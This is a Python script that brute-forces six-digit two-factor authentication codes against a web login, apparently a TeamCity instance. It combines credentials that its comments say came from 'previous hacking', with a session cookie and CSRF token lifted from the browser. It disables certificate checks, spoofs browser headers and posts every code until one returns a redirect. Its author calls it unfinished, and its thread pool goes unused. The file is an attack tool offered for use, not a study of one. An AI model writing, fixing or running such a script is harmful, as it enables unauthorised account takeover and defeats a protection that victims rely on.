# BruteForce6DigitOTP.py
# this is painfully slow...and doesn't work...is a work in progress

import requests
import warnings
import time
import logging
from concurrent.futures import ThreadPoolExecutor

#obtained these values from previous hacking on website

username = ""
password = ""
target_url = "https://xxxxxxx/2fa.html"

# got these values from the webpage, and right clicking Inspect(Q)

TCSESSIONID = ""
tc_csrf_token = ""

found_otp = None
attempts = 0
is_otp_found = False
stop_execution = False

# Suppress the warning about disabling certificate verification
warnings.simplefilter("ignore", category=requests.urllib3.exceptions.InsecureRequestWarning)

# Set up logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    handlers=[
        logging.FileHandler("BruteOTPLog.txt"),
        logging.StreamHandler()
    ]
)

# Generate OTP combinations
def generate_otp_combinations():
    for i in range(1000000):
        otp_str = str(i).zfill(6)
        yield otp_str

# Brute force the OTP using multithreading
def attempt_login(otp_str):
    global found_otp, attempts, is_otp_found, stop_execution

    data = {
        "username": username,
        "password": password,
        "otp": otp_str
    }

    #got these values by running the website through Burp Suite with Intercept turned off.
    headers = {
        "Host": "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://xxxxxx/2fa.html",
        "X-Requested-With": "XMLHttpRequest",
        "X-Teamcity-Client": "Web UI",
        "X-Tc-Csrf-Token": tc_csrf_token,
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://",
        "Dnt": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Cookie": f"TCSESSIONID={TCSESSIONID}; __test=1"
    }
    response = requests.post(target_url, data=data, headers=headers, verify=False)

    attempts += 1
    logging.info(f"Attempted OTP: {otp_str}")

    if response.status_code == 302:
        found_otp = otp_str
        is_otp_found = True
        stop_execution = True
        logging.info(f"Successful login with OTP: {otp_str}")
        return otp_str

    return None

start_time = time.time()

otp_combinations = generate_otp_combinations()

with ThreadPoolExecutor() as executor:
    for otp_str in otp_combinations:
        if stop_execution:
            break

        result = attempt_login(otp_str)
        if result:
            found_otp = result
            break  # Terminate the execution when OTP is found

end_time = time.time()
elapsed_time = end_time - start_time

if found_otp:
    print(f"Last successful OTP: {found_otp}")
else:
    print("No valid OTP found.")

print(f"Total OTP combinations attempted: {attempts}")
print(f"Total elapsed time: {elapsed_time:.2f} seconds")

print("Brute force complete.")
